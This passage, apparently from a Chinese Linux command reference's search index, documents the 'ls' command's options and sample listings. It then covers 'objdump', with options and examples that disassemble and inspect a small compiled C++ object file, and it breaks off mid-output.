[--format={long,verbose,commas,across,vertical,single-col‐umn}] \n   [--sort={none,time,size,extension}] [--time={atime,access,use,ctime,status}] \n   [--color[={none,auto,always}]] [--help] [--version] [--]\n```\n\n###  选项\n\n```shell\n-C     # 多列输出，纵向排序。\n-F     # 每个目录名加 \"/\" 后缀，每个 FIFO 名加 \"|\" 后缀， 每个可运行名加“ * ”后缀。\n-R     # 递归列出遇到的子目录。\n-a     # 列出所有文件，包括以 \".\" 开头的隐含文件。\n-c     # 使用“状态改变时间”代替“文件修改时间”为依据来排序（使用“-t”选项时）或列出（使用“-l”选项时）。\n-d     # 将目录名像其它文件一样列出，而不是列出它们的内容。\n-i     # 输出文件前先输出文件系列号（即 i 节点号: i-node number）。 -l  列出（以单列格式）文件模式\n       # （file mode），文件的链接数，所有者名，组名，文件大小（以字节为单位），时间信息，及文件名。\n       # 缺省时，时间信息显示最近修改时间；可以以选项“-c”和“-u”选择显示其它两种时间信息。对于设备文件，\n       # 原先显示文件大小的区域通常显示的是主要和次要的信号（majorand minor device numbers）。\n-q     # 将文件名中的非打印字符输出为问号。（对于到终端的输出这是缺省的。）\n-r     # 逆序排列。\n-t     # 按时间信息排序。\n-u     # 使用最近访问时间代替最近修改时间为依据来排序（使用“-t”选项时）或列出（使用“-l”选项时）。\n-1     # 单列输出。\n-1, --format=single-column  # 一行输出一个文件（单列输出）。如标准输出不是到终端，此选项就是缺省选项。\n-a, --all # 列出目录中所有文件，包括以“.”开头的文件。\n-b, --escape # 把文件名中不可输出的字符用反斜杠加字符编号(就像在 C 语言里一样)的形式列出。\n-c, --time=ctime, --time=status\n      # 按文件状态改变时间（i节点中的ctime）排序并输出目录内\n      # 容。如采用长格式输出（选项“-l”），使用文件的状态改\n      # 变时间取代文件修改时间。【译注：所谓文件状态改变（i节\n      # 点中以ctime标志），既包括文件被修改，又包括文件属性（ 如所有者、组、链接数等等）的变化】\n-d, --directory\n      # 将目录名像其它文件一样列出，而不是列出它们的内容。\n-f    # 不排序目录内容；按它们在磁盘上存储的顺序列出。同时启 动“ -a ”选项，如果在“ -f ”之前存在“ -l”、\n      # “ - -color ”或“ -s ”，则禁止它们。\n-g    # 忽略，为兼容UNIX用。\n-i, --inode\n      # 在每个文件左边打印  i  节点号（也叫文件序列号和索引号:  file  serial  number and index num‐\n      # ber）。i节点号在每个特定的文件系统中是唯一的。\n-k, --kilobytes\n      # 如列出文件大小，则以千字节KB为单位。\n-l, --format=long, --format=verbose\n      # 输出的信息从左到右依次包括文件名、文件类型、权限、硬链接数、所有者名、组名、大小（byte）\n      # 、及时间信息（如未指明是其它时间即指修改时间）。对于6个月以上的文件或超出未来\n      # 1小时的文件，时间信息中的时分将被年代取代。\n      # 每个目录列出前，有一行“总块数”显示目录下全部文件所占的磁盘空间。块默认是1024字节；\n      # 如果设置了 POSIXLY_CORRECT 的环境变量，除非用“-k”选项，则默认块大小是 512 字节。\n      # 每一个硬链接都计入总块数（因此可能重复计数），这无 疑是个缺点。\n\n# 列出的权限类似于以符号表示（文件）模式的规范。但是 ls\n      # 在每套权限的第三个字符中结合了多位（ multiple bits ） 的信息，如下： s 如果设置了  setuid\n      # 位或 setgid   位，而且也设置了相应的可执行位。 S 如果设置了 setuid 位或 setgid\n      # 位，但是没有设置相应的可执行位。 t 如果设置了  sticky  位，而且也设置了相应的可执行位。  T\n      # 如果设置了 sticky 位，但是没有设置相应的可执行位。              x\n      # 如果仅仅设置了可执行位而非以上四种情况。 - 其它情况（即可执行位未设置）。\n-m, --format=commas\n      # 水平列出文件，每行尽可能多，相互用逗号和一个空格分隔。\n-n, --numeric-uid-gid\n      # 列出数字化的 UID 和 GID 而不是用户名和组名。\n-o    #  以长格式列出目录内容，但是不显示组信息。等于使用“         --format=long          --no-group\n      # ”选项。提供此选项是为了与其它版本的 ls 兼容。\n-p    #  在每个文件名后附上一个字符以说明该文件的类型。类似“ -F ”选项但是不 标示可执行文件。\n-q, --hide-control-chars\n      # 用问号代替文件名中非打印的字符。这是缺省选项。\n-r, --reverse\n      # 逆序排列目录内容。\n-s, --size\n      # 在每个文件名左侧输出该文件的大小，以    1024   字节的块为单位。如果设置了   POSIXLY_CORRECT\n      # 的环境变量，除非用“ -k ”选项，块大小是 512 字节。\n-t, --sort=time\n      # 按文件最近修改时间（ i 节点中的 mtime ）而不是按文件名字典序排序，新文件 靠前。\n-u, --time=atime, --time=access, --time=use\n      # 类似选项“    -t    ”，但是用文件最近访问时间（    i     节点中的     atime     ）取代文件修\n      # 改时间。如果使用长格式列出，打印的时间是最近访问时间。\n-w, --width cols\n       # 假定屏幕宽度是      cols      （      cols     以实际数字取代）列。如未用此选项，缺省值是这\n       # 样获得的：如可能先尝试取自终端驱动，否则尝试取自环境变量          COLUMNS          （如果设\n       # 置了的话），都不行则取 80 。\n\n-x, --format=across, --format=horizontal\n       # 多列输出，横向排序。\n\n-A, --almost-all\n       # 显示除 \".\" 和 \"..\" 外的所有文件。\n\n-B, --ignore-backups\n       # 不输出以“ ~ ”结尾的备份文件，除非已经在命令行中给出。\n\n-C, --format=vertical\n       # 多列输出，纵向排序。当标准输出是终端时这是缺省项。使用命令名 dir 和 d 时， 则总是缺省的。\n\n-D, --dired\n       # 当采用长格式（“-l”选项）输出时，在主要输出后，额外打印一行：  //DIRED//  BEG1 END1 BEG2\n       # END2 ...\n\n# BEGn 和 ENDn 是无符号整数，记录每个文件名的起始、结束位置在输出中的位置（\n#        字节偏移量）。这使得          Emacs          易于找到文件名，即使文件名包含空格或换行等非正\n#        常字符也无需特异的搜索。\n# \n# 如果目录是递归列出的（“ -R ”选项），每个子目录后列出类似一行：\n       # //SUBDIRED//  BEG1 END1 ...  【译注：我测试了 TurboLinux4.0 和 RedHat6.1 ，发现它们都是在 “\n       # //DIRED//     BEG1...     ”之后列出“     //SUBDIRED//     BEG1     ...      ”，也即只有一个\n       # 而不是在每个子目录后都有。而且“ //SUBDIRED// BEG1 ... ”列出的是各个子目 录名的偏移。】\n\n-F, --classify, --file-type\n       # 在每个文件名后附上一个字符以说明该文件的类型。“  * ”表示普通的可执行文件； “ / ”表示目录；“\n       # @ ”表示符号链接；“ | ”表示FIFOs；“ = ”表示套接字 (sockets) ；什么也没有则表示普通文件。\n\n-G, --no-group\n       # 以长格式列目录时不显示组信息。\n\n-I, --ignorepattern\n       # 除非在命令行中给定，不要列出匹配shell文件名匹配式（pattern ，不是指一般\n       # 表达式）的文件。在shell中，文件名以\".\"起始的不与在文件名匹配式(pattern)\n       # 开头的通配符匹配。\n\n-L, --dereference\n       # 列出符号链接指向的文件的信息，而不是符号链接本身。\n\n-N, --literal\n       # 不要用引号引起文件名。\n\n-Q, --quote-name\n       # 用双引号引起文件名，非打印字符以 C 语言的方法表示。\n\n-R, --recursive\n       # 递归列出全部目录的内容。\n\n-S, --sort=size\n       # 按文件大小而不是字典序排序目录内容，大文件靠前。\n\n-T, --tabsize cols\n       # 假定每个制表符宽度是 cols 。缺省为 8。为求效率， ls 可能在输出中使用制表符。  若 cols 为\n       0，则不使用制表符。\n\n-U, --sort=none\n       # 不排序目录内容；按它们在磁盘上存储的顺序列出。（选项“-U”和“-f”的不\n       # 同是前者不启动或禁止相关的选项。）这在列很大的目录时特别有用，因为不加排序\n       # 能显著地加快速度。\n\n-X, --sort=extension\n       # 按文件扩展名（由最后的 \".\" 之后的字符组成）的字典序排序。没有扩展名的先列 出。\n\n--color[=when]\n       # 指定是否使用颜色区别文件类别。环境变量  LS_COLORS  指定使用的颜色。如何设置 这个变量见 dir‐\n       # colors(1) 。 when 可以被省略，或是以下几项之一：\nnone # 不使用颜色，这是缺省项。\n       # auto 仅当标准输出是终端时使用。 always 总是使用颜色。指定 --color 而且省略 when  时就等同于\n       # --color=always 。\n\n--full-time\n       # 列出完整的时间，而不是使用标准的缩写。格式如同          date(1)          的缺省格式；此格式\n       # 是不能改变的，但是你可以用 cut(1) 取出其中的日期字串并将结果送至命令 “ date -d ”。\n\n# 输出的时间包括秒是非常有用的。（ Unix 文件系统储存文件的时间信息精确到秒，\n       # 因此这个选项已经给出了系统所知的全部信息。）例如，当你有一个         Makefile          文件\n       # 不能恰当地生成文件时，这个选项会提供帮助。\n```\n\n###  参数\n\n目录：指定要显示列表的目录，也可以是具体的文件。\n\n###  实例\n\n```shell\n$ ls       # 仅列出当前目录可见文件\n$ ls -l    # 列出当前目录可见文件详细信息\n$ ls -hl   # 列出详细信息并以可读大小显示文件大小\n$ ls -al   # 列出所有文件（包括隐藏）的详细信息\n$ ls --human-readable --size -1 -S --classify # 按文件大小排序\n$ du -sh * | sort -h # 按文件大小排序(同上)\n```\n\n显示当前目录下包括影藏文件在内的所有文件列表\n\n```shell\n[root@localhost ~]# ls -a\n.   anaconda-ks.cfg  .bash_logout   .bashrc  install.log         .mysql_history  satools  .tcshrc   .vimrc\n..  .bash_history    .bash_profile  .cshrc   install.log.syslog  .rnd            .ssh     .viminfo\n```\n\n输出长格式列表\n\n```shell\n[root@localhost ~]# ls -1\n\nanaconda-ks.cfg\ninstall.log\ninstall.log.syslog\nsatools\n```\n\n显示文件的inode信息\n\n索引节点（index inode简称为“inode”）是Linux中一个特殊的概念，具有相同的索引节点号的两个文本本质上是同一个文件（除文件名不同外）。\n\n```shell\n[root@localhost ~]# ls -i -l anaconda-ks.cfg install.log\n2345481 -rw------- 1 root root   859 Jun 11 22:49 anaconda-ks.cfg\n2345474 -rw-r--r-- 1 root root 13837 Jun 11 22:49 install.log\n```\n\n水平输出文件列表\n\n```shell\n[root@localhost /]# ls -m\n\nbin, boot, data, dev, etc, home, lib, lost+found, media, misc, mnt, opt, proc, root, sbin, selinux, srv, sys, tmp, usr, var\n```\n\n修改最后一次编辑的文件\n\n最近修改的文件显示在最上面。\n\n```shell\n[root@localhost /]# ls -t\n\ntmp  root  etc  dev  lib  boot  sys  proc  data  home  bin  sbin  usr  var  lost+found  media  mnt  opt  selinux  srv  misc\n```\n\n显示递归文件\n\n```shell\n[root@localhost ~]# ls -R\n.:\nanaconda-ks.cfg  install.log  install.log.syslog  satools\n\n./satools:\nblack.txt  freemem.sh  iptables.sh  lnmp.sh  mysql  php502_check.sh  ssh_safe.sh\n```\n\n打印文件的UID和GID\n\n```shell\n[root@localhost /]# ls -n\n\ntotal 254\ndrwxr-xr-x   2 0 0  4096 Jun 12 04:03 bin\ndrwxr-xr-x   4 0 0  1024 Jun 15 14:45 boot\ndrwxr-xr-x   6 0 0  4096 Jun 12 10:26 data\ndrwxr-xr-x  10 0 0  3520 Sep 26 15:38 dev\ndrwxr-xr-x  75 0 0  4096 Oct 16 04:02 etc\ndrwxr-xr-x   4 0 0  4096 Jun 12 10:26 home\ndrwxr-xr-x  14 0 0 12288 Jun 16 04:02 lib\ndrwx------   2 0 0 16384 Jun 11 22:46 lost+found\ndrwxr-xr-x   2 0 0  4096 May 11  2011 media\ndrwxr-xr-x   2 0 0  4096 Nov  8  2010 misc\ndrwxr-xr-x   2 0 0  4096 May 11  2011 mnt\ndrwxr-xr-x   2 0 0  4096 May 11  2011 opt\ndr-xr-xr-x 232 0 0     0 Jun 15 11:04 proc\ndrwxr-x---   4 0 0  4096 Oct 15 14:43 root\ndrwxr-xr-x   2 0 0 12288 Jun 12 04:03 sbin\ndrwxr-xr-x   2 0 0  4096 May 11  2011 selinux\ndrwxr-xr-x   2 0 0  4096 May 11  2011 srv\ndrwxr-xr-x  11 0 0     0 Jun 15 11:04 sys\ndrwxrwxrwt   3 0 0 98304 Oct 16 08:45 tmp\ndrwxr-xr-x  13 0 0  4096 Jun 11 23:38 usr\ndrwxr-xr-x  19 0 0  4096 Jun 11 23:38 var\n```\n\n列出文件和文件夹的详细信息\n\n```shell\n[root@localhost /]# ls -l\n\ntotal 254\ndrwxr-xr-x   2 root root  4096 Jun 12 04:03 bin\ndrwxr-xr-x   4 root root  1024 Jun 15 14:45 boot\ndrwxr-xr-x   6 root root  4096 Jun 12 10:26 data\ndrwxr-xr-x  10 root root  3520 Sep 26 15:38 dev\ndrwxr-xr-x  75 root root  4096 Oct 16 04:02 etc\ndrwxr-xr-x   4 root root  4096 Jun 12 10:26 home\ndrwxr-xr-x  14 root root 12288 Jun 16 04:02 lib\ndrwx------   2 root root 16384 Jun 11 22:46 lost+found\ndrwxr-xr-x   2 root root  4096 May 11  2011 media\ndrwxr-xr-x   2 root root  4096 Nov  8  2010 misc\ndrwxr-xr-x   2 root root  4096 May 11  2011 mnt\ndrwxr-xr-x   2 root root  4096 May 11  2011 opt\ndr-xr-xr-x 232 root root     0 Jun 15 11:04 proc\ndrwxr-x---   4 root root  4096 Oct 15 14:43 root\ndrwxr-xr-x   2 root root 12288 Jun 12 04:03 sbin\ndrwxr-xr-x   2 root root  4096 May 11  2011 selinux\ndrwxr-xr-x   2 root root  4096 May 11  2011 srv\ndrwxr-xr-x  11 root root     0 Jun 15 11:04 sys\ndrwxrwxrwt   3 root root 98304 Oct 16 08:48 tmp\ndrwxr-xr-x  13 root root  4096 Jun 11 23:38 usr\ndrwxr-xr-x  19 root root  4096 Jun 11 23:38 var\n```\n\n列出可读文件和文件夹详细信息\n\n```shell\n[root@localhost /]# ls -lh\n\ntotal 254K\ndrwxr-xr-x   2 root root 4.0K Jun 12 04:03 bin\ndrwxr-xr-x   4 root root 1.0K Jun 15 14:45 boot\ndrwxr-xr-x   6 root root 4.0K Jun 12 10:26 data\ndrwxr-xr-x  10 root root 3.5K Sep 26 15:38 dev\ndrwxr-xr-x  75 root root 4.0K Oct 16 04:02 etc\ndrwxr-xr-x   4 root root 4.0K Jun 12 10:26 home\ndrwxr-xr-x  14 root root  12K Jun 16 04:02 lib\ndrwx------   2 root root  16K Jun 11 22:46 lost+found\ndrwxr-xr-x   2 root root 4.0K May 11  2011 media\ndrwxr-xr-x   2 root root 4.0K Nov  8  2010 misc\ndrwxr-xr-x   2 root root 4.0K May 11  2011 mnt\ndrwxr-xr-x   2 root root 4.0K May 11  2011 opt\ndr-xr-xr-x 235 root root    0 Jun 15 11:04 proc\ndrwxr-x---   4 root root 4.0K Oct 15 14:43 root\ndrwxr-xr-x   2 root root  12K Jun 12 04:03 sbin\ndrwxr-xr-x   2 root root 4.0K May 11  2011 selinux\ndrwxr-xr-x   2 root root 4.0K May 11  2011 srv\ndrwxr-xr-x  11 root root    0 Jun 15 11:04 sys\ndrwxrwxrwt   3 root root  96K Oct 16 08:49 tmp\ndrwxr-xr-x  13 root root 4.0K Jun 11 23:38 usr\ndrwxr-xr-x  19 root root 4.0K Jun 11 23:38 var\n```\n\n显示文件夹信息\n\n```shell\n[root@localhost /]# ls -ld /etc/\n\ndrwxr-xr-x 75 root root 4096 Oct 16 04:02 /etc/\n```\n\n按时间列出文件和文件夹详细信息\n\n```shell\n[root@localhost /]# ls -lt\n\ntotal 254\ndrwxrwxrwt   3 root root 98304 Oct 16 08:53 tmp\ndrwxr-xr-x  75 root root  4096 Oct 16 04:02 etc\ndrwxr-x---   4 root root  4096 Oct 15 14:43 root\ndrwxr-xr-x  10 root root  3520 Sep 26 15:38 dev\ndrwxr-xr-x  14 root root 12288 Jun 16 04:02 lib\ndrwxr-xr-x   4 root root  1024 Jun 15 14:45 boot\ndrwxr-xr-x  11 root root     0 Jun 15 11:04 sys\ndr-xr-xr-x 232 root root     0 Jun 15 11:04 proc\ndrwxr-xr-x   6 root root  4096 Jun 12 10:26 data\ndrwxr-xr-x   4 root root  4096 Jun 12 10:26 home\ndrwxr-xr-x   2 root root  4096 Jun 12 04:03 bin\ndrwxr-xr-x   2 root root 12288 Jun 12 04:03 sbin\ndrwxr-xr-x  13 root root  4096 Jun 11 23:38 usr\ndrwxr-xr-x  19 root root  4096 Jun 11 23:38 var\ndrwx------   2 root root 16384 Jun 11 22:46 lost+found\ndrwxr-xr-x   2 root root  4096 May 11  2011 media\ndrwxr-xr-x   2 root root  4096 May 11  2011 mnt\ndrwxr-xr-x   2 root root  4096 May 11  2011 opt\ndrwxr-xr-x   2 root root  4096 May 11  2011 selinux\ndrwxr-xr-x   2 root root  4096 May 11  2011 srv\ndrwxr-xr-x   2 root root  4096 Nov  8  2010 misc\n```\n\n按修改时间列出文件和文件夹详细信息\n\n```shell\n[root@localhost /]# ls -ltr\n\ntotal 254\ndrwxr-xr-x   2 root root  4096 Nov  8  2010 misc\ndrwxr-xr-x   2 root root  4096 May 11  2011 srv\ndrwxr-xr-x   2 root root  4096 May 11  2011 selinux\ndrwxr-xr-x   2 root root  4096 May 11  2011 opt\ndrwxr-xr-x   2 root root  4096 May 11  2011 mnt\ndrwxr-xr-x   2 root root  4096 May 11  2011 media\ndrwx------   2 root root 16384 Jun 11 22:46 lost+found\ndrwxr-xr-x  19 root root  4096 Jun 11 23:38 var\ndrwxr-xr-x  13 root root  4096 Jun 11 23:38 usr\ndrwxr-xr-x   2 root root 12288 Jun 12 04:03 sbin\ndrwxr-xr-x   2 root root  4096 Jun 12 04:03 bin\ndrwxr-xr-x   4 root root  4096 Jun 12 10:26 home\ndrwxr-xr-x   6 root root  4096 Jun 12 10:26 data\ndr-xr-xr-x 232 root root     0 Jun 15 11:04 proc\ndrwxr-xr-x  11 root root     0 Jun 15 11:04 sys\ndrwxr-xr-x   4 root root  1024 Jun 15 14:45 boot\ndrwxr-xr-x  14 root root 12288 Jun 16 04:02 lib\ndrwxr-xr-x  10 root root  3520 Sep 26 15:38 dev\ndrwxr-x---   4 root root  4096 Oct 15 14:43 root\ndrwxr-xr-x  75 root root  4096 Oct 16 04:02 etc\ndrwxrwxrwt   3 root root 98304 Oct 16 08:54 tmp\n```\n\n按照特殊字符对文件进行分类\n\n```shell\n[root@localhost nginx-1.2.1]# ls -F\n\nauto/  CHANGES  CHANGES.ru  conf/  configure*  contrib/  html/  LICENSE  Makefile  man/  objs/  README  src/\n```\n\n列出文件并标记颜色分类\n\n```shell\n[root@localhost nginx-1.2.1]# ls --color=auto\n\nauto  CHANGES  CHANGES.ru  conf  configure  contrib  html  LICENSE  Makefile  man  objs  README  src\n```\n\n## 扩展知识\n\n### 不同颜色代表的文件类型\n\n* `蓝色`<!--rehype:style=background: blue;color:white;-->：目录\n* `绿色`<!--rehype:style=background: green;color:white;-->：可执行文件\n* `白色`<!--rehype:style=background: #efefef;-->：一般性文件，如文本文件，配置文件等\n* `红色`<!--rehype:style=background: red;color:white;-->：压缩文件或归档文件\n* `浅蓝色`<!--rehype:style=background: #c4c3ff;-->：链接文件\n* 红色闪烁：链接文件存在问题\n* 黄色：设备文件\n* 青黄色：管道文件\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","ls"]},{"title":"【Linux 命令】objdump","url":"/linux-command/objdump/","content":"\n显示二进制文件信息\n\n## 补充说明\n\n**objdump命令** 是用查看目标文件或者可执行的目标文件的构成的gcc工具。\n\n###  选项\n\n```shell\n-a --archive-headers \n# 显示档案库的成员信息,类似ls -l将lib*.a的信息列出。 \n\n-b bfdname --target=bfdname \n# 指定目标码格式。这不是必须的，objdump能自动识别许多格式，比如： \n\nobjdump -b oasys -m vax -h fu.o \n# 显示fu.o的头部摘要信息，明确指出该文件是Vax系统下用Oasys编译器生成的目标文件。objdump -i将给出这里可以指定的目标码格式列表。 \n\n-C --demangle \n# 将底层的符号名解码成用户级名字，除了去掉所开头的下划线之外，还使得C++函数名以可理解的方式显示出来。 \n--debugging \n-g \n# 显示调试信息。企图解析保存在文件中的调试信息并以C语言的语法显示出来。仅仅支持某些类型的调试信息。有些其他的格式被readelf -w支持。 \n\n-e --debugging-tags \n# 类似-g选项，但是生成的信息是和ctags工具相兼容的格式。 \n--disassemble \n-d \n# 从objfile中反汇编那些特定指令机器码的section。 \n\n-D --disassemble-all \n# 与 -d 类似，但反汇编所有section. \n\n--prefix-addresses \n# 反汇编的时候，显示每一行的完整地址。这是一种比较老的反汇编格式。 \n\n-EB \n-EL \n--endian={big|little} \n# 指定目标文件的小端。这个项将影响反汇编出来的指令。在反汇编的文件没描述小端信息的时候用。例如S-records. \n\n-f \n--file-headers \n显示objfile中每个文件的整体头部摘要信息。 \n\n-h \n--section-headers \n--headers \n显示目标文件各个section的头部摘要信息。 \n\n-H \n--help \n简短的帮助信息。 \n\n-i \n--info \n显示对于 -b 或者 -m 选项可用的架构和目标格式列表。 \n\n-j name\n--section=name \n仅仅显示指定名称为name的section的信息 \n\n-l\n--line-numbers \n用文件名和行号标注相应的目标代码，仅仅和-d、-D或者-r一起使用使用-ld和使用-d的区别不是很大，在源码级调试的时候有用，要求编译时使用了-g之类的调试编译选项。 \n\n-m machine \n--architecture=machine \n指定反汇编目标文件时使用的架构，当待反汇编文件本身没描述架构信息的时候(比如S-records)，这个选项很有用。可以用-i选项列出这里能够指定的架构. \n\n--reloc \n-r \n显示文件的重定位入口。如果和-d或者-D一起使用，重定位部分以反汇编后的格式显示出来。 \n\n--dynamic-reloc \n-R \n显示文件的动态重定位入口，仅仅对于动态目标文件意义，比如某些共享库。 \n\n-s \n--full-contents \n显示指定section的完整内容。默认所有的非空section都会被显示。 \n\n-S \n--source \n尽可能反汇编出源代码，尤其当编译的时候指定了-g这种调试参数时，效果比较明显。隐含了-d参数。 \n\n--show-raw-insn \n反汇编的时候，显示每条汇编指令对应的机器码，如不指定--prefix-addresses，这将是缺省选项。 \n\n--no-show-raw-insn \n反汇编时，不显示汇编指令的机器码，如不指定--prefix-addresses，这将是缺省选项。 \n\n--start-address=address \n从指定地址开始显示数据，该选项影响-d、-r和-s选项的输出。 \n\n--stop-address=address \n显示数据直到指定地址为止，该项影响-d、-r和-s选项的输出。 \n\n-t \n--syms \n显示文件的符号表入口。类似于nm -s提供的信息 \n\n-T \n--dynamic-syms \n显示文件的动态符号表入口，仅仅对动态目标文件意义，比如某些共享库。它显示的信息类似于 nm -D|--dynamic 显示的信息。 \n\n-V \n--version \n版本信息 \n\n--all-headers \n-x \n显示所可用的头信息，包括符号表、重定位入口。-x 等价于-a -f -h -r -t 同时指定。 \n\n-z \n--disassemble-zeroes \n一般反汇编输出将省略大块的零，该选项使得这些零块也被反汇编。 \n\n@file 可以将选项集中到一个文件中，然后使用这个@file选项载入。\n```\n\n###  实例\n\n首先，在给出后面大部分测试所基于的源代码以及编译指令。 源代码如下： \n\n```shell\nroot@localhost [test]# nl mytest.cpp \n```\n\n```shell\nvoid printTest() {\n    char a;\n    a = 'a';\n}\n\nvoid printTest2() {\nint a = 2;\na+=2;\n} \n```\n\n对以上源代码进行编译，如下： \n\n```shell\n[root@localhost test]# g++ -c -g mytest.cpp \n```\n\n这里，生成的文件是mytest.o，为了方便测试包含了调试的信息，对可执行文件的测试，显示的结果类似。 \n\n **查看当前使用的objdump的版本号： ** \n\n```shell\n[root@localhost test]# objdump -V \nGNU objdump 2.17.50.0.6-14.el5 20061020 \nCopyright 2005 free Software Foundation, Inc. \nThis program is free software; you may redistribute it under the terms of \nthe GNU General Public License.  This program has absolutely no warranty. \n```\n\n **查看档案库文件中的信息： ** \n\n```shell\n[root@localhost test]# objdump -a libmy2.a \nIn archive libmy2.a: \nmyfile.o:     file format elf32-i386 \nrwxrwxrwx 0/0   2724 Nov 16 16:06 2009 myfile.o \nmytest.o:     file format elf32-i386 \nrw-r--r-- 0/0    727 Jul 13 15:32 2011 mytest.o \n```\n\n **这里，libmy2.a是一个使用ar命令将多个*.o目标文件打包而生成的静态库。命令的输出类似`ar -tv`，相比较`ar -tv`输出如下： ** \n\n```shell\n[root@localhost test]# ar -tv libmy2.a \nrwxrwxrwx 0/0   2724 Nov 16 16:06 2009 myfile.o \nrw-r--r-- 0/0    727 Jul 13 15:32 2011 mytest.o \n```\n\n显示可用的架构和目标结构列表： \n\n```shell\n[root@localhost test]# objdump -i \nBFD header file version 2.17.50.0.6-14.el5 20061020 \nelf32-i386 \n(header little endian, data little endian) \n  i386 \na.out-i386-linux \n(header little endian, data little endian) \n  i386 \nefi-app-ia32 \n(header little endian, data little endian) \n  i386 \nelf64-x86-64 \n(header little endian, data little endian) \n  i386 \nelf64-little \n(header little endian, data little endian) \n  i386 \nelf64-big \n(header big endian, data big endian) \n  i386 \nelf32-little \n(header little endian, data little endian) \n  i386 \nelf32-big \n(header big endian, data big endian) \n  i386 \nsrec \n(header endianness unknown, data endianness unknown) \n  i386 \nsymbolsrec \n(header endianness unknown, data endianness unknown) \n  i386 \ntekhex \n(header endianness unknown, data endianness unknown) \n  i386 \nbinary \n(header endianness unknown, data endianness unknown) \n  i386 \nihex \n(header endianness unknown, data endianness unknown) \n  i386 \ntrad-core \n(header endianness unknown, data endianness unknown) \n\n              elf32-i386 a.out-i386-linux efi-app-ia32 elf64-x86-64 \n          i386 elf32-i386 a.out-i386-linux efi-app-ia32 elf64-x86-64 \n\n              elf64-little elf64-big elf32-little elf32-big srec symbolsrec \n          i386 elf64-little elf64-big elf32-little elf32-big srec symbolsrec \n\n              tekhex binary ihex trad-core \n          i386 tekhex binary ihex --------- \n```\n\n这里，显示的信息是相对于 -b 或者 -m 选项可用的架构和目标格式列表。 \n\n **显示mytest.o文件中的text段的内容： ** \n\n```shell\n[root@localhost test]# objdump --section=.text -s mytest.o \nmytest.o:     file format elf32-i386 \nContents of section .text: \n0000 5589e583 ec10c645 ff61c9c3 5589e583  U......E.a..U... \n0010 ec10c745 fc020000 008345fc 02c9c3    ...E......E.... \n```\n\n这里注意，不能单独使用-j或者--section，例如`objdump --section=.text mytest.o`是不会运行成功的。 \n\n **反汇编mytest.o中的text段内容，并尽可能用源代码形式表示： ** \n\n```shell\n[root@localhost test]# objdump -j .text -S mytest.o \nmytest.o:     file format elf32-i386 \nDisassembly of section .text: \n00000000 <_Z9printTestv>: \nvoid printTest() \n   0:   55                      push   %ebp \n   1:   89 e5                   mov    %esp,%ebp \n   3:   83 ec 10                sub    $0x10,%esp \n{ \n        char a; \n        a = 'a'; \n   6:   c6 45 ff 61             movb   $0x61,0xffffffff(%ebp) \n} \n   a:   c9                      leave  \n   b:   c3                      ret    \n\n000000c <_Z10printTest2v>: \nvoid printTest2() \n   c:   55                      push   %ebp \n   d:   89 e5                   mov    %esp,%ebp \n   f:   83 ec 10                sub    $0x10,%esp \n{ \n        int a = 2; \n  12:   c7 45 fc 02 00 00 00    movl   $0x2,0xfffffffc(%ebp) \n        a+=2; \n  19:   83 45 fc 02             addl   $0x2,0xfffffffc(%ebp) \n} \n  1d:   c9                      leave  \n  1e:   c3                      ret    \n```\n\n这里注意，不能单独使用-j或者--section，例如`objdump -j .text mytest.o是不会运行成功的`。另外-S命令对于包含调试信息的目标文件，显示的效果比较好，如果编译时没有指定g++的-g选项，那么目标文件就不包含调试信息，那么显示效果就差多了。 \n\n **反汇编出mytest.o的源代码: ** \n\n```shell\n[root@localhost test]# objdump -S mytest.o \nmytest.o:     file format elf32-i386 \n\nDisassembly of section .text: \n\n00000000 <_Z9printTestv>: \nvoid printTest() \n   0:   55                      push   %ebp \n   1:   89 e5                   mov    %esp,%ebp \n   3:   83 ec 10                sub    $0x10,%esp \n{ \n        char a; \n        a = 'a'; \n   6:   c6 45 ff 61             movb   $0x61,0xffffffff(%ebp) \n} \n   a:   c9                      leave  \n   b:   c3                      ret    \n\n0000000c <_Z10printTest2v>: \nvoid printTest2() \n   c:   55                      push   %ebp \n   d:   89 e5                   mov    %esp,%ebp \n   f:   83 ec 10                sub    $0x10,%esp \n{ \n       int a = 2; \n  12:   c7 45 fc 02 00 00 00    movl   $0x2,0xfffffffc(%ebp) \n        a+=2; \n  19:   83 45 fc 02             addl   $0x2,0xfffffffc(%ebp) \n} \n  1d:   c9                      leave  \n  1e:   c3                      ret    \n```\n\n这里，尤其当编译的时候指定了-g这种调试参数时，反汇编的效果比较明显。隐含了-d参数。 \n\n **显示文件的符号表入口: ** \n\n```shell\n[root@localhost test]# objdump -t mytest.o \nmytest.o:     file format elf32-i386 \n\nSYMBOL TABLE: \n00000000 l    df *ABS*  00000000 mytest.cpp \n00000000 l    d  .text  00000000 .text \n00000000 l    d  .data  00000000 .data \n00000000 l    d  .bss   00000000 .bss \n00000000 l    d  .debug_abbrev  00000000 .debug_abbrev \n00000000 l    d  .debug_info    00000000 .debug_info \n00000000 l    d  .debug_line    00000000 .debug_line \n00000000 l    d  .debug_frame   00000000 .debug_frame \n00000000 l    d  .debug_loc     00000000 .debug_loc \n00000000 l    d  .debug_pubnames        00000000 .debug_pubnames \n00000000 l    d  .debug_aranges 00000000 .debug_aranges \n00000000 l    d  .note.GNU-stack        00000000 .note.GNU-stack \n00000000 l    d  .comment       00000000 .comment \n00000000 g     F .text  0000000c _Z9printTestv \n00000000         *UND*  00000000 __gxx_personality_v0 \n0000000c g     F .text  00000013 _Z10printTest2v \n```\n\n这里，输出的信息类似`nm -s`命令的输出，相比较之下，nm命令的输出如下： \n\n```shell\n[root@localhost test]# nm -s mytest.o \n0000000c T _Z10printTest2v \n00000000 T _Z9printTestv \n         U __gxx_personality_v0 \n```\n\n **显示文件的符号表入口，将底层符号解码并表示成用户级别: ** \n\n```shell\n[root@localhost test]# objdump -t -C mytest.o \nmytest.o:     file format elf32-i386 \nSYMBOL TABLE: \n00000000 l    df *ABS*  00000000 mytest.cpp \n00000000 l    d  .text  00000000 .text \n00000000 l    d  .data  00000000 .data \n00000000 l    d  .bss   00000000 .bss \n00000000 l    d  .debug_abbrev  00000000 .debug_abbrev \n00000000 l    d  .debug_info    00000000 .debug_info \n00000000 l    d  .debug_line    00000000 .debug_line \n00000000 l    d  .debug_frame   00000000 .debug_frame \n00000000 l    d  .debug_loc     00000000 .debug_loc \n00000000 l    d  .debug_pubnames        00000000 .debug_pubnames \n00000000 l    d  .debug_aranges 00000000 .debug_aranges \n00000000 l    d  .note.GNU-stack        00000000 .note.GNU-stack \n00000000 l    d  .comment       00000000 